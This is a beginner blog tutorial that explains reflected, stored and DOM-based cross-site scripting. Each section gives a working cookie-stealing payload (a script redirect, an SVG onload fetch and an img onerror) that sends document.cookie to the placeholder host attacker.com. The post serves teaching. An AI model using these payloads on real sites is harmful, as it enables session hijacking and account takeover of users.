---
title: Basics of Xss
published: true
---
Hey Hackers, Today's article will be about Cross-site scripting. We will be discussing about different types of Cross-site scripting but before that we 
need to know what is cross site scripting. So let's get started :)
<p align="center">
  <img src="https://www.davosnetworks.com/wp-content/uploads/2020/07/cross-site-scripting-xss-864x454.jpg" />
</p>
**What is Cross site Scripting?**   
Cross site scripting a.k.a xss is a type of an injection attack where malicious code is being executed on the website i.e. Malicious JavaScript code. Xss is typically can be founded where input fields like search fields, comment fields, or url defined parameters. XSS is marked as A7 on OWASP TOP 10. As from an attacker perspective, xss can allow a hacker to send malicious script to the victim, thus when the victim will execute the script on the browser side, the attacker can retrieve data from the victim or host a malicious code that can gain access to their computer. I think now you got the idea what xss is :p. Let's just cut to the chase and describe the three types of xss. The three types of xss are: -
1. Reflected XSS
2. Stored XSS
3. DOM-Based XSS

**REFLECTED XSS**   
Reflected xss is defined as where the malicious code is being reflected in the website result. Reflected XSS is a non-persistent attack. Let's take a scenario where awebsite https://www.redacted.com has a forum where the comment field is vulnerable to reflected xss. So the attacker will create an xss payload for e.g: - <br>```https://redacted.com/comment/forum_comment=<script>window.location='http://attacker.com/?cookie='+document.cookie</script>```<br>and place it inside the comment field. So whenever the user clicks on the link inside the comment, it will execute and redirect the user to the attacker server and steal their cookie. Thus the attacker can use the cookie in order to impersonate the user. Or more advanced xss would be to install a malware automatically once the victim has been phished to the attacker server and taking control of their computer.
<p align="center">
  <img src="https://blog.sqreen.com/wp-content/uploads/2018/03/reflexted-xss.png"/>
  Kudos to whoever made this amazing diagram :D
</p>   
**STORED XSS**   
Stored xss a.k.a persistent xss is where the malicious code will constantly execute as it is being stored in the server side. This kind of xss is more dangerous than the reflected or DOM-based xss (Will tell you in the next section about DOM :D) as you don't need to lure the target into clicking a link or any sort of as it will execute everytime when the victim visits that page that contains stored xss payload. For instance, there is a website that contains a section to upload an image and the file upload is vulnerable to xss, so the attacker can create the following payload <br>```<svg xmlns="http://www.w3.org/2000/svg" onload=fetch('//attacker.com/?cookie='+document.cookie)/>```<br> and save it in a file with an extension of svg. Finally then uploading it to the website. Everytime the victim visits the malicious image file, their cookies will be stolen and be send over to the attacker server. Thus the attacker can use the cookies and login to the victim's account.<br>
<p align="center">
  <img src="https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/sorted-XSS.png" /><br>
  kudos to imperva :D
</p><br>
**DOM-BASED XSS**   
According to OWASP website, DOM-Based XSS a.k.a 'type-0 XSS' is such where the malicious code affects the DOM model, thus modifying the DOM environment in the victim's browser. The DOM (Document Object Model) objects can be manipulated and used to create a cross site scripting attack as it only affects the client side and not the server side. Some famous DOM objects that are used in order to exploit DOM XSS are document.url, document.referrer etc. Let's take a scenario where a website https://www.redacted.com/index.html has the following code<br>
```<script>document.write("<p>The Current URL is : </p>" + document.baseURI);</script>```. Now Suppose if the attacker manipulates the url into<br>```http://www.redacted.com/index.html#<img src=x onerror=this.src='http://attacker.com/?'+document.cookie;>```. The malicious javascript code will be executed as it is affecting the document.write function in the DOM environment.<br>
<p align="center">
 <img src="https://gotowebsecurity.com/wp-content/uploads/2017/05/DOM-based-cross-site-scripting-678x381.jpg" />
 Kudos to gotowebsecurity for this amazing diagram :)
</p> 

